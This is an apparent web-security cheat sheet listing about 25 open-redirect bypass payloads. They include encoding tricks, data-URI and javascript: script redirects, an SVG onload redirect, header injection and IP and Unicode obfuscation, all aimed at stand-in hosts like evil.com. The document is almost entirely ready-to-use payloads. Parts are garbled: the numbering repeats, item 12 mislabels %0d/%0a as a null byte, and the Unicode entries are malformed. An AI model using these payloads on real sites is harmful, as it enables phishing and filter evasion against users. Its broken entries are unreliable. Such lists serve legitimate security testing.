Manual Open Redirect Testing Techniques
1. Simply Change the Domain
?redirect=https://example.com → ?redirect=https://evil.com

3. Bypass When Protocol is Blacklisted
?redirect=https://example.com → ?redirect=//evil.com

3. Bypass When Double Slash is Blacklisted
?redirect=https://example.com → ?redirect=\\evil.com

5. Bypass Using http: or https:

?redirect=https://example.com → ?redirect=https:example.com
5. Bypass Using %40 (At Symbol Encoding)

?redirect=example.com → ?redirect=example.com%40evil.com
6. Bypass if Only Checking for Domain Name

?redirect=example.com → ?redirect=example.comevil.com
7. Bypass Using Dot Encoding %2e

?redirect=example.com → ?redirect=example.com%2eevil.com
8. Bypass Using a Question Mark

?redirect=example.com → ?redirect=evil.com?example.com
9. Bypass Using Hash %23

?redirect=example.com → ?redirect=evil.com%23example.com
10. Bypass Using a Symbol

?redirect=example.com → ?redirect=example.com/evil.com
11. Bypass Using URL Encoded Chinese Dot %E3%80%82

?redirect=example.com → ?redirect=evil.com%E3%80%82%23example.com
12. Bypass Using a Null Byte %0d or %0a

?redirect=/ → ?redirect=/%0d/evil.com
13. Encoded URL Redirects

https://example.com/redirect?url=http%3A%2F%2Fmalicious.com
14. Path-Based Redirects

https://example.com/redirect/http://malicious.com
15. Data URI Redirects

https://example.com/redirect?url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnVGhpcyBpcyBhbiBhdHRhY2snKTwvc2NyaXB0Pg==
16. JavaScript Scheme Redirects

https://example.com/redirect?url=javascript:alert('XSS');//
17. Open Redirect via HTTP Header

Location: http://malicious.com
X-Forwarded-Host: evil.com
Refresh: 0; url=http://malicious.com
18. Path Traversal Hybrids

/redirect?url=/../../https://evil.com
19. Using svg paylaod

<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<svg onload="window.location='https://evil.com/'" xmlns="http://www.w3.org/2000/svg"></svg>
20. Case-sensitive Variations

//GOOGLE.com/ → Bypass on case-sensitive filters
//GoOgLe.com/ → Random casing to evade blacklists
21. Trailing Special Characters

//google.com/#/ → Fragment to obscure final redirect
//google.com/;&/ → Extra characters after domain
//google.com/?id=123&// → Obfuscated with trailing ampersands
22. IP Address Variants

http://3232235777 → Decimal IP for 192.168.1.1
http://0xC0A80001 → Hexadecimal IP
http://192.168.1.1/ → Normal IP address
23. IPv6 Notation

http://[::1]/ → IPv6 loopback
http://[::ffff:192.168.1.1]/ → IPv4-mapped IPv6
24. Non-standard Ports

http://google.com:81 → Different port used
https://google.com:444 → May bypass filters by port
25. Unicode Obfuscation in Paths

/%E2%80%http://8Egoogle.com → Unicode injection
/%C2%http://A0google.com → More unicode obfuscation
